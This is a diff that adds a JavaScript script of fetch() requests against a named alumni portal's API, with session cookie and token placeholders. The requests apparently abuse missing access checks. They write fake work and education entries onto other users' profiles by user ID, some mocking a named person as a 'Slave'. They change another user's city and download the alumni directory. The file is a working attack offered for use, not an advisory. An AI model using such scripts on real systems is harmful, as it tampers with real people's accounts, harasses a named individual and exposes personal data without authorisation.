@@ -1,0 +1,73 @@
+// Experience
+fetch("https://mujalumni.in/api/work/save_work", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    },
+    "body": "{\"company_name\":\"Abhay Tripathi\",\"designation_name\":\"Slave\",\"industry_name\":\"Academics\",\"form_work_from_month\":3,\"form_work_to_month\":12,\"form_work_from\":\"2022\",\"form_work_to\":\"2023\",\"uid\":\"3394897\"}",
+    "method": "POST"
+});
+
+// Education
+fetch("https://mujalumni.in/api/education/save_education", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    },
+    "body": "{\"newEdit\":true,\"institute\":\"Abhay Tripathi Institiute of Friend Loyalty\",\"institute_id\":-1,\"start\":\"2022\",\"end\":\"2029\",\"degree\":\"Bachelors of Friendship\",\"submitting\":true,\"iserror\":false,\"error_message\":\"\",\"yoj\":\"2022\",\"yop\":\"2029\",\"insti_name\":\"Abhay Tripathi Institiute of Friend Loyalty\",\"uid\":\"3394897\"}",
+    "method": "POST"
+});
+
+// Location
+fetch("https://mujalumni.in/api/profile/updateUserInfo", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    },
+    "body": "{\"current_city_name\":\"Testing\",\"uid\":\"1553165\"}",
+    "method": "POST"
+});
+
+// THEN:
+
+fetch("https://mujalumni.in/api/profile/user_data_updated", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    },
+    "body": "{\"uid\":\"1553165\",\"updated_by_uid\":3442655,\"updated_field\":{\"current_city\":0}}",
+    "method": "POST"
+});
+
+// Alumni List
+fetch("https://mujalumni.in/api/search/checkPasswordOnDownload", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    },
+    "body": "{\"enteredPass\":\"%PASSWORD%\"}",
+    "method": "POST"
+}).then(r => {r.text().then(t => {console.log(t);});});
+
+// THEN:
+
+fetch("https://mujalumni.in/api/search/download_new/Search%20by%20Role%20%3A%20Alumni?role%5B0%5D=2&other_params[fetch_lost]=true&other_params[viewName]=directory&token=%TOKEN%", {
+    "headers": {
+        "cookie": "tz=%TZ%; lgdomain=%LGDOMAIN%; u_i=%UI%; c_i=%CI%; l_c=%LC%; r_v=%RV%; mul=%MUL%; ast_login_id=%ASTLOGINID%; encToken=%ENCTOKEN%; PHPSESSID=%PHPSESSID%"
+    }
+});
+
+// Login
+
+fetch("https://mujalumni.in/account?cid=359");
+
+// THEN:
+
+fetch("https://mujalumni.in/api/login/loginUser", {
+    "headers": {
+        "csrf": "%CSRF%",
+        "cookie": "tz=Asia%2FKolkata; encToken=%ENCTOKEN%; PHPSESSID=%SESSID%"
+    },
+    "body": "{\"email\":\"%EMAIL%\",\"password\":\"%PASSWORD%\",\"force_signup_cid\":\"359\"}",
+    "method": "POST"
+});
